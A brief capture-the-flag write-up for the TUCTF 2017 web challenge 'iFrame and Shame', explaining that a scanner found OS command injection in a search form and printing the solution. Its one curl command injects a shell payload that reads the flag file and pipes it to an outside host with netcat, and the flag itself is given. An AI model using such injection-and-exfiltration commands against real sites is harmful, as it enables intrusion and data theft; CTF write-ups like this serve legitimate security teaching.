---
layout: post
title: "Solution to TUCTF 2017 iFrame and Shame"
author: capitol
category: ctf
---
![arachnid](/images/arachnid.jpg)

##### name:
iFrame and Shame

##### category:
web

##### points:
300

#### Writeup

We where tired and just pointed [arachni](http://www.arachni-scanner.com/) at the page and it reported that there was os command injection in the form.

Once we knew that it was just a question of getting the flag, there was some sort of limit on number of rows returned, so we just piped the flag to our server with nc.

```bash
curl 'http://iframeshame.tuctf.com/' --data 'search=" ; cat flag | nc <ip> <port> ; "&Submit=Submit+Query'
```

flag was TUCTF{D0nt_Th1nk_H4x0r$_C4nt_3sc4p3_Y0ur_Pr0t3ct10ns}
